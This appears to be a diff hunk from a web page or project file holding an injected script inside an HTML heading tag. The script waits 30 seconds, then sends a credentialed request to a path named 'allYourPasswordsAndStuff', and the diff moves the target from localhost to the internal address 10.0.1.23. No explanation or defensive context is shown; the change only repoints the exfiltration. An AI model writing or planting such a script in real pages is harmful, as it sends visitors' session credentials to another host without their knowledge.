@@ -26,7 +26,7 @@ setTimeout(sendStuff, 30000)
 function sendStuff(){
 var xhr = new XMLHttpRequest();
 xhr.withCredentials = true;
-xhr.open("GET", "http://localhost:81/whereISend/allYourPasswordsAndStuff", true);
+xhr.open("GET", "http://10.0.1.23:80/whereISend/allYourPasswordsAndStuff", true);
 xhr.send();
 }
 </script></h3>
